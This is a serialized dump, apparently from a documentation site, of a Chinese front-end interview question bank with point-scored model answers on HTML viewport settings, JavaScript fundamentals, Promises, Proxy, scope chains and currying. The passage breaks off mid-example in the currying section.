级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"code","raw":"```html\\n<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no\\"/>\\n```","lang":"html","text":"<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no\\"/>"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 60. 如果需要手动写动画，你认为最小时间间隔是多久，为什么？\\n\\n","depth":2,"text":"60. 如果需要手动写动画，你认为最小时间间隔是多久，为什么？","tokens":[{"type":"text","raw":"60. 如果需要手动写动画，你认为最小时间间隔是多久，为什么？","text":"60. 如果需要手动写动画，你认为最小时间间隔是多久，为什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"多数显示器默认频率是60Hz，即1秒刷新60次，所以理论上最小间隔为1/60＊1000ms ＝ 16.7ms。","text":"多数显示器默认频率是60Hz，即1秒刷新60次，所以理论上最小间隔为1/60＊1000ms ＝ 16.7ms。","tokens":[{"type":"text","raw":"多数显示器默认频率是60Hz，即1秒刷新60次，所以理论上最小间隔为1/60＊1000ms ＝ 16.7ms。","text":"多数显示器默认频率是60Hz，即1秒刷新60次，所以理论上最小间隔为1/60＊1000ms ＝ 16.7ms。","escaped":false}]}]},{"key":"JavaScript","content":"<h1>JavaScript</h1>\\n<h2>1. JS 数据类型有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；</li>\\n<li><strong>1：</strong> 引用类型：对象（Object）、函数（Function）、数组（Array）等；</li>\\n</ul>\\n<h2>2. == 和 === 的区别是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，&#39;5&#39; == 5 为 true;</li>\\n<li><strong>1：</strong> === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，&#39;5&#39; === 5 为 false;</li>\\n</ul>\\n<h2>3. var 、let 、 const 的区别是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n        提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;</li>\\n<li><strong>1：</strong> let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n    提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;</li>\\n<li><strong>1：</strong> 区别:\\n      const： 需要在声明时初始化，且之后不能被修改;\\n      let：可以修改其值;\\n      var： 是函数作用域或全局作用域，let 和 const 是块级作用域;</li>\\n</ul>\\n<h2>4. 什么是事件冒泡和事件捕获？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 事件冒泡：事件从目标元素开始，向上冒泡到 document;</li>\\n<li><strong>1：</strong> 事件捕获：事件从 document 开始，向下捕获到目标元素;</li>\\n<li><strong>1：</strong> 事件流顺序: 1.捕获 -&gt; 2.目标 -&gt; 3.冒泡;</li>\\n<li><strong>2：</strong> 引用类型：对象（Object）、函数（Function）、数组（Array）等；</li>\\n</ul>\\n<h2>5. JS 什么是防抖和节流？它们的应用场景有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。</li>\\n<li><strong>2：</strong> 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。</li>\\n</ul>\\n<h2>6. JS 请解释在 JavaScript 中this指针的工作原理，在以下函数调用场景中this指向什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code></h4>\\n<pre><code class=\\"language-js\\">const person = {\\n    name: &quot;张三&quot;,\\n    sayHello: function() {\\n        console.log(`你好，我的名字叫 ${this.name}`);\\n    }\\n};\\nperson.sayHello();\\n</code></pre>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 在person.sayHello()调用中，this指向person对象。</li>\\n<li><strong>1：</strong> 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name</li>\\n</ul>\\n<h2>7. JS 请解释setTimeout和setInterval的区别，并说明如何清除定时器</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() =&gt; console.log(&#39;Delayed&#39;), 1000);，1 秒后会执行一次回调打印Delayed。\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() =&gt; console.log(&#39;Repeating&#39;), 1000);，每隔 1 秒就会执行一次回调打印Repeating。</li>\\n<li><strong>1：</strong> 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() =&gt; console.log(&#39;Timeout&#39;), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n    使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。</li>\\n</ul>\\n<h2>8. Promise 的常用方法</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。</li>\\n<li><strong>1：</strong> Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。</li>\\n<li><strong>1：</strong> Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。</li>\\n<li><strong>1：</strong> Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。</li>\\n<li><strong>1：</strong> Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。</li>\\n<li><strong>1：</strong> Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。</li>\\n<li><strong>1：</strong> Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。</li>\\n</ul>\\n<h2>9. 解释 Set 和 Map 的使用及区别</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：W5</h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Set：是一个集合，用于存储不重复的值，按照插入顺序排列。</li>\\n<li><strong>1：</strong> Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。</li>\\n</ul>\\n<pre><code class=\\"language-js\\">// Set\\nlet set = new Set();\\nset.add(1);\\nset.add(2);\\nset.add(2); // 会被忽略\\nconsole.log(set); // Set { 1, 2 }\\n\\n// Map\\nlet map = new Map();\\nmap.set(&#39;name&#39;, &#39;Alice&#39;);\\nmap.set(&#39;age&#39;, 25);\\nconsole.log(map.get(&#39;name&#39;)); // Alice\\n</code></pre>\\n<h2>10. 请写出几个 JavaScript 函数，用于实现数组去重</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（8 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 方法一：使用Set对象（ES6 及以上）</li>\\n</ul>\\n<pre><code class=\\"language-js\\">//原理：Set是一种新的数据结构，它类似于数组，但是成员的值都是唯一的。可以将数组转换为Set，然后再转换回数组来实现去重。\\nfunction uniqueArray(arr) {\\n    return [...new Set(arr)];\\n}\\nlet array = [1, 2, 2, 3, 4, 4];\\nconsole.log(uniqueArray(array)); // 输出[1, 2, 3, 4]\\n//解释：new Set(array)会创建一个Set对象，其中包含了array中的所有元素，并且自动去重。然后，通过扩展运算符...将Set对象转换回数组，得到去重后的结果。\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 方法二：使用循环和一个新数组</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function uniqueArray(arr) {\\n    let newArray = [];\\n    for (let i = 0; i &lt; arr.length; i++) {\\n        if (!newArray.includes(arr[i])) {\\n            newArray.push(arr[i]);\\n        }\\n    }\\n    return newArray;\\n}\\nlet array = [1, 2, 2, 3, 4, 4];\\n    console.log(uniqueArray(array)); // 输出[1, 2, 3, 4]\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 方法三：使用filter方法和indexOf函数</li>\\n</ul>\\n<pre><code class=\\"language-js\\">//原理：filter方法用于过滤数组中的元素，indexOf函数用于查找元素在数组中的首次出现位置。通过filter方法遍历数组，只保留首次出现的元素，从而实现去重。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = array.filter((element, index, self) =&gt; {\\n    return self.indexOf(element) === index;\\n});\\nconsole.log(uniqueArray);\\n//解释：filter方法的回调函数接收三个参数：element（当前元素）、index（当前元素的索引）和self（数组本身）。在回调函数中，self.indexOf(element)会查找element在数组中的首次出现位置。如果这个位置等于当前元素的索引index，说明这个元素是首次出现的，filter方法会保留这个元素；否则，就过滤掉这个元素。最终filter方法返回一个新的去重后的数组。\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 方法四：使用reduce方法</li>\\n</ul>\\n<pre><code class=\\"language-js\\">//原理：reduce方法用于对数组中的每个元素执行一个由您提供的reducer函数（升序执行），将其结果汇总为单个返回值。可以利用reduce方法来构建一个新的去重数组。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = array.reduce((acc, cur) =&gt; {\\n    if (!acc.includes(cur)) {\\n        acc.push(cur);\\n    }\\n    return acc;\\n}, []);\\nconsole.log(uniqueArray);\\n//解释：reduce方法的第一个参数是一个reducer函数，它接收两个参数：acc（累加器，初始值是一个空数组[]）和cur（当前元素）。在reducer函数中，如果acc数组不包含cur元素（acc.includes(cur)返回false），就将cur添加到acc中。最后，reduce方法返回acc，即去重后的数组。\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 方法五：使用Object对象（以元素为键）</li>\\n</ul>\\n<pre><code class=\\"language-js\\">//原理：利用Object的键的唯一性，将数组元素作为对象的键，值可以任意设置（这里设置为true），然后获取对象的键并转换回数组来实现去重。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = [];\\nlet tempObj = {};\\nfor (let i = 0; i &lt; array.length; i++) {\\n    let current = array[i];\\n    if (!tempObj[current]) {\\n        uniqueArray.push(current);\\n        tempObj[current] = true;\\n    }\\n}\\nconsole.log(uniqueArray);\\n//解释：首先创建一个空数组uniqueArray用于存储去重后的元素，以及一个空对象tempObj。然后遍历array数组，对于每个元素current，检查tempObj对象中是否已经存在以current为键的属性（tempObj[current]是否为true）。如果不存在，就将current添加到uniqueArray中，并在tempObj中添加一个以current为键，值为true的属性。这样，利用对象键的唯一性实现了数组去重。最后返回uniqueArray。\\n</code></pre>\\n</details>\\n\\n<h2>11. ES6 和 CommonJS 的区别</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>2：</strong> CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const</li>\\n<li><strong>2：</strong> import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错</li>\\n</ul>\\n<p>注：S6 Module和CommonJS模块的共同点：</p>\\n<p>CommonJS和ES6 Module都可以对引⼊的对象进⾏赋值，即对对象内部属性的值进⾏改变</p>\\n<p><a href=\\"https://juejin.cn/post/7331931937357496354\\">docs</a></p>\\n<h2>12. new 操作符的实现原理</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>2：</strong> new操作符的执行过程：</li>\\n</ul>\\n<blockquote>\\n<p>（1）首先创建了一个新的空对象</p>\\n<p>（2）设置原型，将对象的原型设置为函数的 prototype 对象</p>\\n<p>（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）</p>\\n<p>（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象</p>\\n</blockquote>\\n<pre><code class=\\"language-js\\">function objectFactory() {\\n  let newObject = null;\\n  let constructor = Array.prototype.shift.call(arguments);\\n  let result = null;\\n  // 判断参数是否是一个函数\\n  if (typeof constructor !== &quot;function&quot;) {\\n    console.error(&quot;type error&quot;);\\n    return;\\n  }\\n  // 新建一个空对象，对象的原型为构造函数的 prototype 对象\\n  newObject = Object.create(constructor.prototype);\\n  // 将 this 指向新建对象，并执行函数\\n  result = constructor.apply(newObject, arguments);\\n  // 判断返回对象\\n  let flag = result &amp;&amp; (typeof result === &quot;object&quot; || typeof result === &quot;function&quot;);\\n  // 判断返回结果\\n  return flag ? result : newObject;\\n}\\n// 使用方法\\nobjectFactory(构造函数, 初始化参数);\\n</code></pre>\\n</details>\\n\\n<h2>13. 数组的原生方法有哪些？</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。</li>\\n<li><strong>1：</strong> 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。</li>\\n<li><strong>1：</strong> 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。</li>\\n<li><strong>1：</strong> 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。</li>\\n<li><strong>1：</strong> 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。</li>\\n<li><strong>1：</strong> 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法</li>\\n<li><strong>1：</strong> 数组归并方法 reduce() 和 reduceRight() 方法</li>\\n</ul>\\n</details>\\n\\n<h2>14. bind、call、apply 区别</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同</li>\\n<li><strong>1：</strong> 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组</li>\\n</ul>\\n<pre><code class=\\"language-js\\">let a = { value: 1 }\\nfunction\\n  getValue(name, age) {\\n  console.log(name)\\n  console.log(age)\\n  console.log(this.value)\\n}\\ngetValue.call(a, &#39;yck&#39;,&#39;24&#39;)\\ngetValue.apply(a,[&#39;yck&#39;, &#39;24&#39;])\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化</li>\\n</ul>\\n</details>\\n\\n<h2>15. == 和 ===区别，什么情况⽤ ==</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断</li>\\n</ul>\\n<h2>16. Proxy 的使用</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>4：</strong> 部分 API</li>\\n</ul>\\n<p><img src=\\"https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3e08a8f141f44148ad6f66c7fdc1ab3e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp\\" alt=\\"\\"></p>\\n<ul>\\n<li><strong>1：</strong> 函数调用的监听</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function fun() {\\n    console.log(&quot;哈哈哈&quot;);\\n}\\n\\nconst objProxy = new Proxy(fun, {\\n    /**\\n     * 拦截对函数的调用的捕获器\\n     * @param target target new Proxy 所代理的 obj（监听的对象）\\n     * @param thisArg 调用函数时绑定的 this 值\\n     * @param argArray 调用函数时传递的参数列表\\n     */\\n    apply(target, thisArg, argArray) {\\n        console.log(&quot;对 fun 函数进行了 apply 的调用。&quot;);\\n        // 调用原始函数，并在其结果前后添加一些内容\\n        target.apply(thisArg, argArray)\\n    },\\n    /**\\n     * 监听 class 时的捕获器\\n     * @param target target new Proxy 所代理的 obj（监听的对象）\\n     * @param argArray new fun() 时传入的参数，例：new fun(1, 2, ...rest)\\n     * @param newTarget 被调用的构造函数。在这里，newTarget 就是 objProxy 本身，因为 objProxy 是一个函数代理\\n     */\\n    construct(target, argArray, newTarget) {\\n        console.log(&quot;对 fun 函数进行了 construct 的调用。&quot;);\\n        return new target(...argArray)\\n    }\\n});\\n\\nobjProxy.apply();\\nnew objProxy();\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> new Proxy 中 receiver 参数的作用</li>\\n</ul>\\n<pre><code class=\\"language-js\\">const obj = {\\n    _name: &quot;里斯&quot;,\\n    age: 16,\\n    get name() {\\n        return this._name;\\n    },\\n    set name(newValue) {\\n        this._name = newValue;\\n    }\\n};\\n\\nconst objProxy = new Proxy(obj, {\\n    /**\\n     * receiver 就是 objProxy 这个代理对象\\n     * receiver 传入 Reflect.get 之后，他就作为 obj 里的 this 了（this 这个时候就改变了）\\n     *\\n     */\\n    get(target, key, receiver) {\\n        console.log(receiver);\\n        /**\\n         * 传入 receiver 后，他被访问了两次\\n         */\\n        return Reflect.get(target, key, receiver);\\n    },\\n    set(target, key, newValue, receiver) {\\n        Reflect.set(target, key, newValue, receiver);\\n    }\\n});\\n\\nobjProxy.name = &quot;哈哈哈&quot;;\\nconsole.log(objProxy.name);\\n</code></pre>\\n</details>\\n\\n<h2>17. Object.defineProperty 的使用</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>1：</strong> Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。</p>\\n</li>\\n<li><p><strong>1：</strong> 访问属性描述符包括：configurable、enumerable、writable、value</p>\\n</li>\\n<li><p><strong>1：</strong> 访问属性描述符的方法：Object.getOwnPropertyDescriptor()</p>\\n</li>\\n<li><p><strong>1：</strong> 缺点</p>\\n<p>  ① 一次监听太多的时候，不是很友好</p>\\n<p>  ② 新增、删除的时候，他是无能为力的</p>\\n<p>  ③ 会修改原对象中的属性</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-js\\">const obj = {\\n    name: &quot;里斯&quot;,\\n    age: 16\\n};\\n\\n/**\\n * 监听某个属性\\n */\\n/*\\nObject.defineProperty(obj, &quot;name&quot;, {\\n    set(v) {\\n        console.log(v);\\n        console.log(&quot;监听到 set&quot;);\\n    },\\n    get() {\\n        console.log(&quot;监听到 get&quot;);\\n    }\\n});\\n*/\\n\\n/**\\n * 监听所有的属性\\n */\\nObject.keys(obj).forEach(key =&gt; {\\n    console.log(key);\\n    let value = obj[key];\\n    Object.defineProperty(obj, key, {\\n        set(v) {\\n            console.log(`监听到属性 ${key}，被 set 为 ${v}`);\\n            value = v;\\n        },\\n        get() {\\n            console.log(`监听到属性 ${key} get`);\\n            return value;\\n        }\\n    });\\n});\\n\\n\\nobj.name = &quot;哈哈哈&quot;;\\n\\nconsole.log(obj.name);\\n</code></pre>\\n</details>\\n\\n<h2>18. 作用域链的理解</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<p>注：作用域链是指在 JavaScript 中，当访问一个变量时，JavaScript 引擎会按照一定的顺序在当前作用域以及其上层作用域中查找该变量。这个查找的过程就形成了作用域链。</p>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 数据类型</li>\\n</ul>\\n<pre><code class=\\"language-mermaid\\">graph TD;\\n\\n    A[作用域链] --&gt; B[作用域];\\n    A --&gt; C[词法作用域];\\n    A --&gt; D[作用域链];\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 作用域</li>\\n</ul>\\n<p>作用域即变量（变量作用域又称上下文）和函数生效（能被访问）的区域或集合。它决定了代码区块中变量和其他资源的可见性。\\n例如：</p>\\n<pre><code class=\\"language-js\\">\\nfunction greet() {\\n  var greeting = &#39;Hello World!&#39;;\\n  console.log(greeting);\\n}\\ngreet();\\n\\nconsole.log(greeting);// Uncaught ReferenceError: greeting is not defined\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 全局作用域</li>\\n</ul>\\n<p>任何不在函数中或是大括号中声明的变量，都是在全局作用域下。全局作用域下声明的变量可以在程序的任意位置访问。</p>\\n<pre><code class=\\"language-js\\">// 全局变量\\nvar greeting = &#39;Hello World!&#39;;\\nfunction greet() {\\n  console.log(greeting);\\n}\\n// 打印 &#39;Hello World!&#39;\\ngreet();\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 函数作用域</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function greet() {\\n  var greeting = &#39;Hello World!&#39;;\\n  console.log(greeting);\\n}\\n// 打印 &#39;Hello World!&#39;\\ngreet();\\n// 报错: Uncaught ReferenceError: greeting is not defined\\nconsole.log(greeting);\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 块级作用域</li>\\n</ul>\\n<p>ES6 引入：ES6 引入了let和const关键字，与var关键字不同，在大括号中使用let和const声明的变量存在于块级作用域中。在大括号之外不能访问这些变量。</p>\\n<pre><code class=\\"language-js\\">{\\n  // 块级作用域中的变量\\n  let greeting = &#39;Hello World!&#39;;\\n  var lang = &#39;English&#39;;\\n  console.log(greeting); // Prints &#39;Hello World!&#39;\\n}\\n// 变量 &#39;English&#39;\\nconsole.log(lang);\\n// 报错: Uncaught ReferenceError: greeting is not defined\\nconsole.log(greeting);\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 词法作用域</li>\\n</ul>\\n<p>词法作用域又叫静态作用域，变量在创建时就确定好了其作用域，而非在执行阶段确定。也就是说，在编写代码时作用域就已经确定了，JavaScript 遵循的就是词法作用域</p>\\n<pre><code class=\\"language-js\\">\\nvar a = 2;\\nfunction foo() {\\n  console.log(a);\\n}\\nfunction bar() {\\n  var a = 3;\\n  foo();\\n}\\nbar();\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 作用域链</li>\\n</ul>\\n<p>在 JavaScript 中使用一个变量时，JavaScript 引擎会尝试在当前作用域下去寻找该变量。如果没找到，再到它的上层作用域寻找，以此类推直到找到该变量或是已经到了全局作用域。</p>\\n<p>如果在全局作用域里仍然找不到该变量，它就会在全局范围内隐式声明该变量（非严格模式下）或是直接报错。</p>\\n<pre><code class=\\"language-js\\">\\nvar sex = &#39;男&#39;;\\nfunction person() {\\n    var name = &#39;张三&#39;;\\n    function student() {\\n        var age = 18;\\n        console.log(name); // 张三\\n        console.log(sex); // 男\\n    }\\n    student();\\n    console.log(age); // Uncaught ReferenceError: age is not defined\\n}\\nperson();\\n\\n/*\\nstudent 函数内部：\\n当查找name时，在student函数内部找不到，向上一层作用域（person函数内部）找，找到了输出 “张三”。\\n当查找sex时，在student函数内部找不到，向上一层作用域（person函数内部）找，还找不到继续向上一层找，即全局作用域，找到了输出 “男”。\\n\\nperson 函数内部：\\n当查找age时，在person函数内部找不到，向上一层找，即全局作用域，还是找不到则报错。\\n\\n*/\\n</code></pre>\\n</details>\\n\\n<h2>19. 柯里化</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<p>给函数传递一部分参数来调用这个函数，并且 当前的这个函数他会在返回一个函数，去处理剩余的参数，见下面 示例：</p>\\n<p><img src=\\"/public/images/3_JavaScript_20241224170424.png\\" alt=\\"\\"></p>\\n<p>也就是 拆分函数的参数，这样的就可以叫 柯里化。</p>\\n<ul>\\n<li><strong>1：</strong> 使用函数柯里化的好处？</li>\\n</ul>\\n<p>在函数式的编程中，尽量 让一个函数处理一个问题，尽可能的单一，而不是将一些问题交给一个方法去解决，就好比 react 的函数式组件，你的一个功能组件是经过多个 UI 组件合成而来的一样，所以我们可以将每次传入的参数在，当前函数中处理，在当前函数处理完成后，在下一个函数中在使用上一个函数的处理结果即可。</p>\\n<ul>\\n<li><strong>1：</strong> 例子</li>\\n</ul>\\n<p>实现一个给第一个参数加2，给第二个参数乘2的例子</p>\\n<p><img src=\\"/public/images/3_JavaScript_20241224170632.png\\" alt=\\"\\"></p>\\n<ul>\\n<li><strong>2：</strong> 柯里化函数的实现</li>\\n</ul>\\n<pre><code class=\\"language-js\\">/**\\n * 多参函数 转 柯里化函数\\n */\\nfunction currying(fn) { // 接受一个函数,返回一个函数\\n    // 这里是接受剩余参数\\n    function receivedParameters(...args) {\\n        // 判断当前已经接受到的参数的个数, 和参数本身(这个参数本身就是一个函数)需要接收到参数是否已经一致\\n        // console.log(fn.length);\\n        // console.log(args.length);\\n        // 到传入函数的参数(fn 的参数) 大于 传入的参数(...args)时,就直接调用传入的函数\\n        if (args.length &gt;= fn.length) {\\n            // 这个 apply 